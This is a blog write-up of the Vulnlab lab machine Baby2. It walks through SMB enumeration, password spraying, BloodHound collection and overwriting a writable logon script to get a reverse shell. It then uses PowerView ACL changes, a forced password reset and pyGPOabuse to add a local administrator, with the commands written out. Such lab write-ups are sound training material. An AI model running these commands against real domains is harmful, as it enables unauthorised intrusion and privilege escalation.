---
title: "Vulnlab: Baby2 Writeup. Exploring Misconfigured Logon Scripts and Abusing GPOs Through Misconfigured ACLs"
date: "2024-09-18 00:00:00 +0800"
categories: [Vulnlab]
tags: [Vulnlab, Active Directory, Red Teaming]
---
# First Words
First of all, welcome to my first blog post! I am starting a new series where I will post Vulnlab machines and chains writeups every week, trying to explain the attacks and techniques presented.
I am open to suggestions, so do not hesitate to contact me on Discord/LinkedIn or Twitter! Enjoy.
# Description
In this blog post I will show you a writeup on the Windows machine Baby2, from Vulnlab, where I will talk about abusing logon scripts, getting a reverse shell through vbs and abusing GPOs through ACL to create a new local administrator account.
# Information Gathering and Enumeration
Nmap Scan:
```
# Nmap 7.94SVN scan initiated Tue Sep 17 19:50:55 2024 as: nmap -sCV -v -oN nmap/initial 10.10.68.49
Nmap scan report for 10.10.68.49 (10.10.68.49)
Host is up (0.042s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-17 16:51:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T16:41:28
| Not valid after:  2025-09-17T16:41:28
| MD5:   6975:880d:db09:00a3:4d0a:1313:5624:d01d
|_SHA-1: 8b4f:3808:eaba:b04e:f7ab:d8a7:71db:c5f4:367a:7c1b
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T16:41:28
| Not valid after:  2025-09-17T16:41:28
| MD5:   6975:880d:db09:00a3:4d0a:1313:5624:d01d
|_SHA-1: 8b4f:3808:eaba:b04e:f7ab:d8a7:71db:c5f4:367a:7c1b
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T16:41:28
| Not valid after:  2025-09-17T16:41:28
| MD5:   6975:880d:db09:00a3:4d0a:1313:5624:d01d
|_SHA-1: 8b4f:3808:eaba:b04e:f7ab:d8a7:71db:c5f4:367a:7c1b
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.baby2.vl
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T16:41:28
| Not valid after:  2025-09-17T16:41:28
| MD5:   6975:880d:db09:00a3:4d0a:1313:5624:d01d
|_SHA-1: 8b4f:3808:eaba:b04e:f7ab:d8a7:71db:c5f4:367a:7c1b
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.baby2.vl
| Issuer: commonName=dc.baby2.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-16T16:50:18
| Not valid after:  2025-03-18T16:50:18
| MD5:   496f:cd90:e5f6:2a1b:293d:ea6c:4001:e8b0
|_SHA-1: a637:e2b0:9620:ae8e:c6ab:7af1:3d43:738f:5dbb:ce12
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-09-17T16:51:44+00:00
|_ssl-date: 2024-09-17T16:52:24+00:00; -1s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-17T16:51:45
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 17 19:52:27 2024 -- 1 IP address (1 host up) scanned in 91.67 seconds
```
The first thing I went for was enumerating the SMB shares and see if I can access any of them without having valid credentials.
```
nxc smb 10.10.68.49 -u 'guest' -p '' --shares
```
![[Pasted image 20240917200849.png]](../img/0.png)
Inside the `homes` share I noticed some usernames and I supposed that these are the users on the box.
Moving forward, checking `NETLOGON`, I found a `login.vbs` script:
```
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```
Inside the `apps` share there was a `dev` directory and also a `login.vbs.lnk` file:

![[Pasted image 20240917201134.png]](../img/2.png)

I ran strings on it, because if you try to cat it, your shell will break:

![[Pasted image 20240917201205.png]](../img/3.png)

I couldn't find any more useful information, so I tried uploading malicious vbs scripts in the users' directories, along with other techniques to try to get a connection back to my `smbserver` and try to crack a hash(SMB Signing is enabled so you cannot relay the NetNTLM hash), but that didn't happen.

After some time, I moved to password spraying, using the same password as the username, and I got a hit for `Carl.Moore:Carl.Moore` (tbh, I kinda hate these kinds of paths because they are the last things I try but doesn't really matter).

I checked again, what shares I can access but this time as `Carl.Moore`:
```
nxc smb 10.10.68.49 -u Carl.Moore -p Carl.Moore --shares
```
![[Pasted image 20240917201748.png]](../img/4.png)
Remember, the `login.vbs.lnk`, there was an interesting path in `SYSVOL` so I checked if I can access it as `Carl.Moore` (Access Denied if you try as guest).
There was, again, a `login.vbs` file, but no useful information inside.
## Logon Scripts Abuse

Using `Carl.Moore`'s credentials, I started to perform some authenticated domain enumeration using `bloodhound`:
```
nxc ldap 10.10.68.49 -u Carl.Moore -p Carl.Moore --bloodhound -ns 10.10.68.49 -c All
```
![[Pasted image 20240917203236.png]](../img/5.png)

Every user has a logonscript where we can replace it with our own. 

**A logon script is a script that is executed under the context of a given user when that user logs into a computer in an Active Directory environment.**

The following misconfigurations can be found in logon scripts:
1. – Plaintext credentials
2. – Mapping file shares/deploying files that have unsafe permissions
3. – Logon scripts with insecure permissions <- Our Case !
4. – Mapping non-existing shares

This issue occurs **when the logon script itself, or perhaps the _NETLOGON_ share, is misconfigured such that it allows _Authenticated Users, Everyone, and/or Domain Users_ _write_ or _modification_ rights**. You can imagine that if any given user can modify any given logon script, the results could be pretty bad. This would allow for code execution, lateral movement, and even privilege escalation, all with built-in tools and very little in the way of out-of-the-box detection.

My first attempt was trying to point the script to my share, so I can get the NetNTLMv2 hash, but I got a weird response and couldn't really crack it:

![[Pasted image 20240917203319.png]](../img/6.png)
## Exploitation
I modified `login.vbs` and used a payload from `revshells.com` to get a reverse shell:

![[Pasted image 20240917203722.png]](../img/7.png)
After a bit of waiting, I got a reverse shell!

![[Pasted image 20240917203747.png]](../img/8.png)
# Privilege Escalation
Running `whoami /groups`, we can see `Amelia.Griffiths` is part of 2 custom groups which are `legacy` and `office`.

Checking `legacy` in `bloodhound`, we can see we have `WriteDacl` and `WriteOwner` permissions over `gpoadm` and over `gpo-management@baby2.vl`:

![[Pasted image 20240917205402.png]](../img/9.png)
First, I used `powerview` to give my `legacy` group `GenericAll` permissions:
```
Add-DomainObjectAcl -TargetIdentity "GPOADM" -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose
```
![[Pasted image 20240917211130.png]](../img/10.png)

Changing `gpoadm`'s password:
```
Set-ADAccountPassword -Identity 'CN=GPOADM,OU=GPO-MANAGEMENT,DC=BABY2,DC=VL' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password1@" -Force)
```
After owning the `gpoadm` user, I could use `pyGPOabuse` using the ID of gpos, to create a new administrator account and use `evil-winrm` to log in:

![[Pasted image 20240917211306.png]](../img/11.png)
This tool created a new local administrator with the user `john` and the password of `Hax00r123..`
```
evil-winrm -i 10.10.68.49 -u john -p H4x00r123..
```
![[Pasted image 20240917223306.png]](../img/12.png)
Thank you for reading my blog post and I will see you in the next one !

[https://api.vulnlab.com/api/v1/share?id=a92e58d3-e2f0-49fc-931d-6dae9d0b997f
](https://api.vulnlab.com/api/v1/share?id=a92e58d3-e2f0-49fc-931d-6dae9d0b997f)

# Resources
[https://www.thehacker.recipes/ad/movement/group-policies](https://www.thehacker.recipes/ad/movement/group-policies)

[https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/
](https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/)
